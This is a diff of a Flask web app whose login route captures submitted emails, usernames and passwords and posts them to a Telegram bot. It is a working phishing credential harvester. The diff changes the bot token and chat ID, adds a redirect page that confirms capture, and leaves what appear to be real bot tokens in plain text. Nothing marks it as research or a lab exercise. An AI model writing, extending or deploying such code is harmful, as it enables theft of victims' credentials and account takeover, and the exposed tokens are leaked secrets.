@@ -1,6 +1,7 @@
 from flask import Flask, render_template, request, redirect, url_for, flash
 import requests
 import logging
+import time
 
 # Configure logging
 logging.basicConfig(level=logging.DEBUG)
@@ -9,8 +10,8 @@ app = Flask(__name__)
 app.config['SECRET_KEY'] = 'your_secret_key_here'
 
 # Replace with your Telegram bot token and chat ID
-TELEGRAM_BOT_TOKEN = '8371650981:AAGhw37bZcTLirZwIaDwryef2BWDSxpXlzk'
-TELEGRAM_CHAT_ID = ' 8397775572'
+TELEGRAM_BOT_TOKEN = '7986783861:AAEvBWaOxcIR3VvdGNK3HWqqBDle_j3atE8'
+TELEGRAM_CHAT_ID = '1174627659'
 
 # Function to send a message to Telegram
 def send_to_telegram(message):
@@ -23,13 +24,26 @@ def send_to_telegram(message):
         response = requests.post(url, data=payload)
         response.raise_for_status()  # Check for HTTP request errors
         app.logger.debug("Message sent to Telegram successfully.")
+        return True
     except requests.exceptions.RequestException as e:
         app.logger.error(f"Failed to send message to Telegram. Error: {str(e)}")
-        flash(f"Failed to send message to Telegram. Error: {str(e)}", 'error')
+        return False
 
 @app.route('/')
 def index():
     return render_template('index.html')
+
+@app.route('/message')
+def message():
+    # Get the message parameters from the query string
+    success = request.args.get('success', type=bool, default=False)
+    email = request.args.get('email', '')
+    username = request.args.get('username', '')
+    
+    return render_template('message.html', 
+                          success=success, 
+                          email=email, 
+                          username=username)
 
 @app.route('/login', methods=['POST'])
 def login():
@@ -38,11 +52,14 @@ def login():
     password = request.form['password']
 
     # Send email and password to Telegram
-    message = f"Email: {email}\n Username: {username} \nPassword: {password}"
-    send_to_telegram(message)
-
-    flash('Login details sent successfully.', 'success')
-    return redirect(url_for('index'))
+    message_text = f"Email: {email}\nUsername: {username}\nPassword: {password}"
+    success = send_to_telegram(message_text)
+    
+    # Redirect to message page first with parameters
+    return redirect(url_for('message', 
+                           success=success, 
+                           email=email, 
+                           username=username))
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080, debug=True)
